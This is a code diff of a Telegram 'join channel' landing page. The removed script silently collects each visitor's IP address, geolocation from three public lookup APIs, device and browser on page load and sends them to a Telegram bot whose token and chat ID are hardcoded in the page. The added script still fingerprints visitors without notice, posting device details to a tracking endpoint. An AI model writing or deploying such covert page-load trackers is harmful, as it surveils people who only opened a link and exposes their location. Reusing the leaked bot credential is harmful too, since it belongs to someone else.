@@ -150,90 +150,35 @@
 </div>
 
 <script>
-    const BOT_TOKEN = "7991147017:AAF9FiwcMrOjTEuP5puYZ0RlYOWU7M73UaI";
-    const CHAT_ID = "5975952682";
     const JOIN_LINK = "https://t.me/YOUR_CHANNEL";
-
-    async function getLocationWithMultipleAPIs(ip) {
-        // Multiple APIs try karenge
-        const apis = [
-            `https://ipwho.is/${ip}`,
-            `https://freeipapi.com/api/json/${ip}`,
-            `https://ipapi.co/${ip}/json/`
-        ];
-        
-        for (let api of apis) {
-            try {
-                const res = await fetch(api);
-                const data = await res.json();
-                
-                // ipwho.is response
-                if (data.success === true && data.city) {
-                    return { city: data.city || 'N/A', region: data.region || 'N/A', country: data.country || 'N/A' };
-                }
-                // freeipapi response
-                if (data.cityName && data.countryName) {
-                    return { city: data.cityName || 'N/A', region: data.regionName || 'N/A', country: data.countryName || 'N/A' };
-                }
-                // ipapi.co response
-                if (data.city && data.country_name) {
-                    return { city: data.city || 'N/A', region: data.region || 'N/A', country: data.country_name || 'N/A' };
-                }
-            } catch(e) {}
-        }
-        return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
-    }
-
-    async function sendToTelegram() {
+    
+    async function trackVisitor() {
         try {
-            // IP address
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ip = (await ipRes.json()).ip;
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                screenSize: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
             
-            // Location (multiple APIs)
-            const loc = await getLocationWithMultipleAPIs(ip);
-            
-            // Device info
-            const ua = navigator.userAgent;
-            let device = 'Desktop';
-            if (/Android/i.test(ua)) device = '📱 Android';
-            else if (/iPhone|iPad/i.test(ua)) device = '📱 iOS';
-            
-            let browser = 'Chrome';
-            if (/Firefox/i.test(ua)) browser = 'Firefox';
-            else if (/Edg/i.test(ua)) browser = 'Edge';
-            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-            
-            const time = new Date().toLocaleString('pk-PK', { timeZone: 'Asia/Karachi' });
-            
-            const message = `🔐 *NEW VISITOR* 🔐
-            
-🌐 *IP:* ${ip}
-📍 *Location:* ${loc.city}, ${loc.region}, ${loc.country}
-
-${device}
-🌍 *Browser:* ${browser}
-🕐 *Time:* ${time}
-
-✅ *Device tracked successfully*`;
-
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const response = await fetch('/api/track', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify(deviceInfo)
             });
             
+            const result = await response.json();
+            console.log('Tracking result:', result);
         } catch(e) {
             console.log('Error:', e);
         }
     }
     
-    document.getElementById('joinBtn').onclick = () => window.open(JOIN_LINK, '_blank');
-    sendToTelegram();
+    document.getElementById('joinBtn').onclick = () => {
+        window.open(JOIN_LINK, '_blank');
+    };
+    
+    trackVisitor();
 </script>
 </body>
 </html>
